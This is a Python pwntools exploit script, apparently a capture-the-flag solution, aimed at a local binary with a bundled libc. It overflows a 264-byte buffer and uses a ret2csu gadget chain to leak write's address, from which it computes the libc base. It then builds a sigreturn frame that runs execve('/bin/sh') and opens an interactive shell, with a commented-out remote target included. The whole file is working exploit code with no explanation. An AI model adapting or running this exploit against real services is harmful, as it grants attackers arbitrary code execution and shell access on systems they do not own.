from pwn import *
import sys

def exploit():
	p1 =  cyclic(264)
	p1 += p64(init2)
	p1 += csu_init(elf.got['write'], 1, elf.got['write'], 8, init1)
	p1 += csu_init(0, 0, 0, 0, elf.sym['main'])

	p.sendline(p1)
	leak = u64(p.recv()[0x100:0x108])
	libc.address = leak - libc.sym['write']

	log.info('libc :       0x%x' % libc.address)

	p2 =  cyclic(264)
	p2 += p64(libc.address + poprax)
	p2 += p64(0xf)
	p2 += p64(libc.address + syscall)

	frame = SigreturnFrame(kernel = 'amd64')
	frame.rax = 0x3b
	frame.rdi = next(libc.search('/bin/sh'))
	frame.rsp = libc.address + syscall
	frame.rip = libc.address + syscall

	p2 += str(frame)

	p.sendline(p2)
	p.interactive()

def csu_init(func, arg1, arg2, arg3, returns):
	payload =  'A' * 8
	payload += p64(0) # rbx
	payload += p64(1) # rbp
	payload += p64(func) # r12
	payload += p64(arg1) # r13
	payload += p64(arg2) # r14
	payload += p64(arg3) # r15
	payload += p64(returns) # rip
	return payload


def main():
	global b, l, elf, libc, p, init1, init2, syscall, poprax

	# context.log_level = 'debug'
	context.arch = 'amd64'

	b    = './binary'
	l    = './libc.so.6'
	elf  = ELF(b)
	libc = ELF(l)
	# p = process(b)
	p = process(b, env={'LD_PRELOAD' : l})
	# p = remote('localhost', 8888)

	init1 = 0x400750
	init2 = 0x400766

	syscall = 0xd2975
	poprax  = 0x439c7

	exploit()

if __name__ == '__main__':
	main()
